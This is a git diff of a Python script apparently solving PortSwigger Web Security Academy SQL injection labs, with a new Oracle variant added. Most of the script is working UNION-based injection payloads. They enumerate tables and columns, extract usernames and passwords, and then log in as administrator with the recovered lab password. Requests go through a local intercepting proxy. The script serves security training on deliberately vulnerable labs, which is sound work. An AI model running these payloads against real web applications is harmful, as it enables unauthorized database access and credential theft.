@@ -1,18 +1,19 @@
 # https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
 # https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
 # https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+# https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
 
 import requests
 requests.packages.urllib3.disable_warnings()
 
-base = "https://acc51f001facc69a80aa125200f200aa.web-security-academy.net"
+base = "https://ac531f011fb0912c80e3504000d7009a.web-security-academy.net"
 path = "/filter"
 url = base + path
 
 proxy = "127.0.0.1:8080"
 proxies = {"https": proxy, "http": proxy}
 verify = False
-cookies = {"session": "PgmhyoW7ObaehMh7w6zh9HpZZOLUxQCG"}
+cookies = {"session": "Need a valid session token here"}
 
 def findNumberOfColumns():
     for i in range(1,11):
@@ -32,8 +33,9 @@ def queryingDatabaseVersionMysqlMicrosoft():
 
 def login():
     username = "administrator"
-    csrf = "CsyYEYVDp3hcOqVxMWheXvwayPoYpa0U"
-    password = "e63lyfhsxoyeakv1fytd"
+    csrf = "Need a valid CSRF token here"
+    # password = "e63lyfhsxoyeakv1fytd" # NonOracle
+    password = "plkdb9u3f39szz04u91z" # Oracle
     data = {"csrf": csrf, "username": username, "password": password}
     route = "/login"
     requests.post(url=base + route, data=data, cookies=cookies, proxies=proxies, verify=verify)
@@ -62,8 +64,34 @@ def listingDatabaseContentsNonOracle():
     # listAllColumnNames()
     retrieveUserNameAndPassword()
 
+def listingDatabaseContentsOracle():
+    table = "USERS_GCTTNX"
+
+    def listAllTableNames():
+        q = f"' UNION SELECT TABLE_NAME, NULL FROM all_tables-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+    def listAllColumnNames():
+        q = f"' UNION SELECT COLUMN_NAME, NULL FROM all_tab_columns WHERE table_name = '{table}'-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+    def retrieveUserNameAndPassword():
+        col1 = "USERNAME_KTGDCI"
+        col2 = "PASSWORD_ENHVAM"
+        q = f"' UNION SELECT {col1}, {col2} FROM {table}-- "
+        params = {"category": q}
+        requests.get(url, params=params, cookies=cookies, proxies=proxies, verify=verify)
+
+    # listAllTableNames()
+    # listAllColumnNames()
+    retrieveUserNameAndPassword()
+
+
 # findNumberOfColumns()
 # queryingDatabaseVersionOracle()
 # queryingDatabaseVersionMysqlMicrosoft()
 # listingDatabaseContentsNonOracle()
+# listingDatabaseContentsOracle()
 login()
